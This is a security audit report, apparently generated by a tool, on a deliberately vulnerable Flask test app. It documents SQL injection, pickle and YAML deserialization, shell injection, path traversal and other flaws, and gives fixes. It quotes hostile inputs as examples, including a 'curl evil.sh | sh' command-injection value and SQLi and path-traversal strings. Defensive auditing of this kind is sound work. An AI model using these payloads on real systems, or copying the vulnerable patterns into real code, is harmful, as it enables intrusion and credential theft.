# Security Audit — python-vuln-app
Date: 2026-09-22 | Scope: working tree (fixture directory, no independent git repo) | Auditor: security-skills v1.2.0-4-g433fb22
Knowledge base: 36 vuln-db entries (newest 2026-09-11) | Live checks: NOT RUN (no network per audit constraints)

## Stack
Python/Flask single-file application (`app.py`, 62 lines, 6 routes). No dependency manifest (no requirements.txt/pyproject), no Docker/CI/IaC files, no frontend. Storage: sqlite3 local file (`app.db`). Auth: none enforced anywhere (one hardcoded `ADMIN_TOKEN` constant exists but is never checked). Libraries in use: flask, PyYAML, stdlib pickle/subprocess/sqlite3.

## Summary
| Severity | Count |
|---|---|
| Critical | 6 |
| High | 4 |
| Medium | 4 |
| Low | 0 |

Chains (Phase 2.5):
- **Unauthenticated RCE, three independent paths**: pickle (`/import`) + yaml unsafe (`/render`) + shell injection (`/backup`) with 0/6 routes authenticated
- **DEBUG console → RCE with zero other bugs**: `DEBUG=True` exposes the Werkzeug debugger (unauthenticated console if reachable)
- **Credential dump**: path traversal (`/file`) → read `app.db` → plaintext passwords (SEC-005)
- **Login bypass**: SQLi on `/login` + no rate limiting/lockout

## Findings

### SEC-001: Hardcoded admin token (Hugging Face format, placeholder value) — MEDIUM
- **Where:** `app.py:12`
- **CWE:** CWE-798 (Hardcoded Credentials)
- **Evidence:**
  ```python
  ADMIN_TOKEN = "hf_FakeTokenForEvalFixtures123"
  ```
- **Impact:** The value is an off-format placeholder (contains "Fake...ForEvalFixtures") — not directly usable. Risk is the pattern: a real deployment that "temporarily" keeps a literal token here, and the variable is also echoed to logs (SEC-010). If a realistic value lands here it becomes Critical (HF tokens with write scope allow model-repo poisoning).
- **Fix:** Load from env/secret manager (`os.environ["ADMIN_TOKEN"]`); rotate any value that ever touched git history.

### SEC-002: Hardcoded DB password (placeholder-in-prod pattern) — MEDIUM
- **Where:** `app.py:13`
- **CWE:** CWE-798
- **Evidence:**
  ```python
  DB_PASSWORD = "changeme-prod-2024"
  ```
- **Impact:** Placeholder value, but "prod" naming says it will be deployed with something like it. `changeme*` passwords are first guesses in every attack wordlist.
- **Fix:** Env var / secret manager; fail startup if the value matches known placeholder patterns.

### SEC-003: Flask DEBUG enabled (Werkzeug debugger = RCE) — HIGH
- **Where:** `app.py:16`
- **CWE:** CWE-489 (Active Debug Code)
- **Evidence:**
  ```python
  app.config["DEBUG"] = True
  ```
- **Impact:** With the Werkzeug debugger reachable, an attacker gets an interactive Python console (`__import__('os').system(...)`) — unauthenticated RCE with zero other bugs. Pairs with SEC-011 (no auth on any route).
- **Fix:** Remove the line; debug must come from env (`FLASK_DEBUG`) and default off in prod configs.

### SEC-004: SQL injection on login — CRITICAL
- **Where:** `app.py:25`
- **CWE:** CWE-89
- **Evidence:**
  ```python
  row = conn.execute(f"SELECT * FROM users WHERE name = '{username}'").fetchone()
  ```
- **Impact:** Unauthenticated auth bypass (`' OR '1'='1' --` returns the first row; the check then compares `row[2]` to the submitted password — see SEC-005 interaction: any row whose third column equals attacker-chosen value). Also UNION-based extraction of the whole users table (plaintext passwords, SEC-005).
- **Fix:** `conn.execute("SELECT ... WHERE name = ?", (username,))` — parameterize; never f-strings into SQL.
- **References:** CWE-89, OWASP A03

### SEC-005: Plaintext password storage/comparison — CRITICAL
- **Where:** `app.py:26`
- **CWE:** CWE-256 / CWE-916
- **Evidence:**
  ```python
  if row and row[2] == password:
  ```
- **Impact:** Passwords stored (and compared) in plaintext: any DB read (SQLi SEC-004, file-read SEC-009, backup file) yields every credential verbatim. Combined with SEC-004 this is a full credential dump.
- **Fix:** Store `argon2id`/`bcrypt` hashes; verify with the library's constant-time check. Requires migration for existing rows.

### SEC-006: Insecure deserialization — pickle.loads on request body — CRITICAL
- **Where:** `app.py:34`
- **CWE:** CWE-502
- **Evidence:**
  ```python
  data = pickle.loads(request.get_data())
  ```
- **Impact:** Unauthenticated RCE — a crafted pickle payload executes arbitrary code on load. Classic gadget chains need no special server state.
- **Fix:** Accept JSON instead; if a binary format is required, use a signed/enveloped format, never raw pickle on network input.
- **References:** CWE-502, OWASP A08

### SEC-007: Unsafe YAML load — CRITICAL
- **Where:** `app.py:41`
- **CWE:** CWE-502
- **Evidence:**
  ```python
  cfg = yaml.load(request.get_data(), Loader=yaml.Loader)
  ```
- **Impact:** `yaml.Loader` (unsafe FullLoader-family) honors `!!python/object/apply:` tags → arbitrary code execution, unauthenticated. PyYAML version is unpinnable here (no manifest, SEC-013), so even FullLoader-era bypasses (CVE-2020-14343 family, vuln-db entry) cannot be excluded.
- **Fix:** `yaml.safe_load(request.get_data())` (or `Loader=yaml.SafeLoader`).
- **References:** CWE-502; vuln-db CVE-2020-14343

### SEC-008: OS command injection via shell=True concatenation — CRITICAL
- **Where:** `app.py:48`
- **CWE:** CWE-78
- **Evidence:**
  ```python
  subprocess.call("tar czf /tmp/backup.tar.gz " + request.form["path"], shell=True)
  ```
- **Impact:** Unauthenticated RCE: `path=.; curl evil.sh | sh` (or backticks/`$(...)`) executes with the app's privileges. Backup filename also lands in predictable `/tmp/backup.tar.gz` (symlink-clobber note).
- **Fix:** `subprocess.run(["tar", "czf", out, "--", path], shell=False)` with a validated, canonicalized path allowlist.
- **References:** CWE-78, OWASP A03

### SEC-009: Arbitrary file read (path traversal, no validation) — HIGH
- **Where:** `app.py:55`
- **CWE:** CWE-22
- **Evidence:**
  ```python
  return open(request.args.get("name")).read()
  ```
- **Impact:** Unauthenticated read of any file the process can see (`?name=../../etc/passwd`, `?name=app.db` → full credential material given SEC-005; config, source, keys). No GET→auth either (SEC-011).
- **Fix:** Canonicalize + containment (`os.path.realpath`, ensure it stays under a served root) or map ids to a fixed directory.
- **References:** CWE-22, OWASP A01

### SEC-010: Secrets logged; no auth audit events — HIGH
- **Where:** `app.py:61` (and 19-28 for the audit gap)
- **CWE:** CWE-532 / CWE-778 / CWE-117 (header value printed unsanitized — log forging)
- **Evidence:**
  ```python
  print(f"auth header: {request.headers.get('Authorization')}, token: {ADMIN_TOKEN}")
  ```
- **Impact:** The app's admin token and inbound Authorization headers (may contain user credentials/tokens) are written to stdout/logs, which typically ship to aggregators with broader access and longer retention than the DB. Header content is unescaped → log forging. Meanwhile `/login` emits NO success/failure audit events — successful takeovers (via SEC-004) leave no trail.
- **Fix:** Structured logging with field-level redaction; log login success/failure with actor+timestamp; sanitize header values before embedding in log lines.

### SEC-011: No authentication/authorization on ANY route (census 0/6) — CRITICAL
- **Where:** `app.py` (all routes: 19, 31, 38, 45, 52, 58)
- **CWE:** CWE-306
- **Evidence:** Route census — 6/6 routes (`/login`, `/import`, `/render`, `/backup`, `/file`, `/health`) registered with no `before_request` guard, no session/token check; grep for `before_request|login_required|session|current_user` → only the /health print line matches (a read, not a guard).
- **Impact:** Destructive/administrative endpoints (`/import`, `/backup`) and data access (`/file`) are internet-reachable as-is; every other finding's exploitability is "unauthenticated". This is the multiplier that turns SEC-006/007/008 into plain RCE.
- **Fix:** Global auth `before_request` + per-route role decorators; keep `/health` trivial and unauthenticated by design.

### SEC-012: No rate limiting / lockout on login — HIGH
- **Where:** `app.py:19-28`
- **CWE:** CWE-307
- **Evidence:** No limiter middleware, no failure counters, no lockout anywhere in the file.
- **Impact:** Unlimited credential stuffing/brute force; combined with SEC-004 it also enables high-volume extraction. Chain-critical component of "enumeration → stuffing".
- **Fix:** Per-account+per-IP limiter (e.g. `flask-limiter`), exponential backoff/lockout, log failures (see SEC-010 fix).

### SEC-013: No dependency manifest — unpinned/unverifiable stack — MEDIUM
- **Where:** (absence — no requirements.txt/pyproject.toml in tree)
- **CWE:** CWE-1104
- **Evidence:** `rg --files -g 'requirements*' -g 'pyproject.toml' -g 'Pipfile*'` → 0 results, while the code imports flask + yaml.
- **Impact:** Deployments resolve whatever versions the build machine finds — non-reproducible, and the exact flask/PyYAML versions can't be checked against advisories (SEC-007's uncertainty is a direct symptom).
- **Fix:** Add requirements.txt (or pyproject) with pinned versions + a lockfile/hash pinning; then re-run the dependency scan.

### SEC-014: No security headers / hardening middleware — MEDIUM
- **Where:** `app.py:10-16` (app setup — only DEBUG is configured)
- **CWE:** CWE-693
- **Evidence:** No header/after_request middleware; grep for CORS/headers config → none.
- **Impact:** Missing `X-Content-Type-Options`, CSP, HSTS notes. Standalone defense-in-depth gap today (no XSS sink found), but the debug error pages (SEC-003) render with no hardening.
- **Fix:** Add an `after_request` with baseline headers once templates/frontend exist; keep list minimal and honest.

## What looks good
- Login failure responses are uniform ("nope", 401) — no direct username enumeration via response body
- No outbound HTTP calls anywhere — no SSRF surface
- No dynamic template rendering / no client-side storage — XSS surface is absent
- Sqlite connection is a local file with no embedded credentials (near-miss that stays a non-finding)
- The fixture data convention (off-format fake token) kept this audit's secret triage honest — placeholder values were correctly downgraded, not screamed about

## Recommended fix order
1. SEC-003 (kill DEBUG — one line, removes a standalone RCE) → S
2. SEC-011 (auth middleware on all routes) → M
3. SEC-004 + SEC-005 (parameterize login + hash passwords — one migration) → M
4. SEC-006/007/008 (pickle→JSON, safe_load, shell=False) → S each
5. SEC-009 (path containment) → S
6. SEC-010/SEC-012 (redacted structured logging + login rate limiting) → M
7. SEC-013 (manifest + pinning, enables dep scanning) → S
8. SEC-001/002/014 (secret hygiene, headers) → S

## Not assessed (completeness gate)
- A06/A08 live OSV/KEV checks — no network in this environment AND no manifest to resolve versions (SEC-013)
- A10 SSRF — no outbound request code exists (N/A, verified by grep)
- LLM stack — an `hf_`-format token constant exists but no LLM/AI framework usage (N/A)
- Multi-tenant scoping / flow analysis — no stateful business flow beyond login (N/A, verified by grep)
